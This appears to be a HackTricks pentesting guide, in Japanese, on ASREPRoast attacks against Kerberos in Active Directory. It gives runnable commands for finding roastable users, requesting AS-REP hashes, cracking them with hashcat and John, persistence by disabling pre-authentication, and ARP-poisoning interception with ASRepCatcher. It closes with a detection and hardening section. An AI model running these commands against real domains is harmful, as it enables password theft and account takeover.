# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoastは、**Kerberos pre-authentication required attribute**が設定されていないユーザーを悪用するセキュリティ攻撃です。この脆弱性により、攻撃者はユーザーのパスワードを知らなくても、Domain Controller（DC）にユーザーの認証を要求できます。するとDCは、ユーザーのパスワードから導出されたキーで暗号化されたメッセージを返します。攻撃者はこのメッセージをオフラインでcrackし、ユーザーのパスワードを特定できます。

この攻撃の主な要件は次のとおりです。

- **Kerberos pre-authenticationが無効**: 標的ユーザーでこのセキュリティ機能が有効になっていないこと。
- **Domain Controller（DC）への接続**: 攻撃者がDCにアクセスし、リクエストを送信して暗号化されたメッセージを受信できること。
- **任意のドメインアカウント**: ドメインアカウントがあれば、LDAPクエリを使って脆弱なユーザーをより効率的に特定できます。アカウントがない場合、攻撃者はユーザー名を推測する必要があります。

#### 脆弱なユーザーの列挙（ドメインの認証情報が必要）

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### AS_REP メッセージの要求

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus はデフォルトで **RC4** を要求するため、Event ID **4768** には通常、**preauth type 0** と **ticket encryption type 0x17** が表示されます。**`/aes`** を追加する場合（または対象で RC4 が無効になっている場合）は、代わりに **AES etypes** が使われます。<sup>[[2]](#references)</sup>

#### クイックワンライナー（Linux）

- まず Kerberos userenum で潜在的なターゲットを列挙します（例: leaked build paths から）：`kerbrute userenum users.txt -d domain --dc dc.domain`
- 有効な認証情報がなくても、NetExec でユーザー名リスト全体を roast します：`netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- 認証情報がある場合は、NetExec に LDAP を照会させ、roast 可能なアカウントをすべて要求します：`netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- 出力が **`$krb5asrep$23$`** で始まる場合は、Hashcat **`-m 18200`** で crack します。**`$krb5asrep$17$`** または **`$krb5asrep$18$`** で始まる場合は、John **`--format=krb5asrep`** を使うのがおすすめです。<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

すべての AS-REP roast が RC4 だとは限りません。最新のツールでは、要求またはネゴシエートされた enctype に応じて、**RC4**（`$krb5asrep$23$`）または **AES**（`$krb5asrep$17$` / `$krb5asrep$18$`）が返されることがあります。**`hashcat -m 18200`** は **etype 23** 用ですが、**John** は `krb5asrep` を **17/18/23** で直接処理できます。<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### 永続化

**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーについて、**preauth** を不要に設定します:

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### 検知とハードニング

**preauthenticationなしのAS-REPリクエスト**が成功すると、DCに`Status=0x0`、`PreAuthType=0`の**4768**イベントが記録されます。これはリクエストの記録であり、誰かが応答をcrackした、またはアカウントを侵害したことの証明ではありません。検知条件としてRC4を必須にしないでください。`TicketEncryptionType=0x17`は弱い暗号化を示す有用なシグナルですが、攻撃者はAES（イベントログ値`0x11`/`0x12`）を要求できます。Windows Server 2016以降で、2025年1月14日（またはそれ以降）の累積更新プログラムを適用している場合、イベント4768のバージョン2では`ClientAdvertizedEncryptionTypes`、アカウント/DCでサポートされるetype、および利用可能なキーも確認できます。<sup>[[5]](#references)</sup>

実用的な調査では、アカウントにAESキーがあるのにクライアントがRC4のみを通知しているケースにフラグを立て、その後、複数のpreauthenticationなしユーザーに対する、同一送信元IPからの短時間の大量リクエストを相関させます。すべての`PreAuthType=0`イベントでアラートを出すのではなく、正当な例外をベースライン化してください。

送信元の特定では、`IpAddress`フィールド（`::ffff:`形式でマッピングされたIPv4が含まれる場合があります）を正規化し、時間範囲を4769のservice ticketイベント、または5140の共有アクセスイベントと比較します。これらのイベントには、同じアドレスからアクティブだったアカウントが記録されている場合がありますが、preauthenticationなしのAS-REPリクエストには認証済みアカウントが不要です。共有ホスト、NAT、プロキシ、複数のセッションがあるため、IPの一致だけではAS-REQを送信した人物やアカウントを特定できません。関連アカウントは調査の手がかりとして扱い、エンドポイントまたはネットワークの証拠で裏付けてください。<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

恒久的な対策は、厳密に必要でないすべてのユーザーについて**Kerberosのpreauthenticationを要求しない**設定を解除し、露出したアカウントのパスワードをローテーションすることです。例外を解除できない場合は、長くランダムに生成したパスワードを使用し、権限を最小限にしてください。RC4を無効にするとcrackingのコストは上がりますが、AESのAS-REP応答もオフラインでcrackできるため、roast可能な状態は解消されません。<sup>[[2]](#references)[[5]](#references)</sup>

## 認証情報なしのASREProast

オンパス攻撃者は、通常のpreauthenticated AS交換中に返されるAS-REPをキャプチャし、その暗号化部分をオフラインcracking用に整形できます。古典的なASREPRoastingとは異なり、これは`DONT_REQ_PREAUTH`を必要としません。ただし、実際にKerberos交換を傍受できたアカウントのみが対象になります。**ASRepCatcher**は、デフォルトで一方向のARP poisoningを使ってその位置を確保します。または、`--disable-spoofing`を指定して、別のMitM手法で取得したトラフィックを取り込むこともできます。<sup>[[6]](#references)</sup>\
no-preauth principalから**TGT**ではなく**service ticket**を返す、関連する認証情報不要の手法については、[Kerberoast](kerberoast.md)を参照してください。

`relay`モードでは、[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)が傍受したAS-REQを転送し、両側がまだ許可している場合は**RC4**を強制します。`listen`はパケットを変更しないため、クライアントとDCがネゴシエートした任意のenctypeをキャプチャします。可能であれば、サブネット全体に触れるのではなく、`-t`/`-tf`でpoisoningの範囲を指定してください。<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [AES AS-REP のRoasting – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno（AS-REP roast → ZipSlip → DLL hijack）](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – イベント 4768: Kerberos 認証チケットが要求された](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – セキュリティ イベント 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – セキュリティ イベント 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
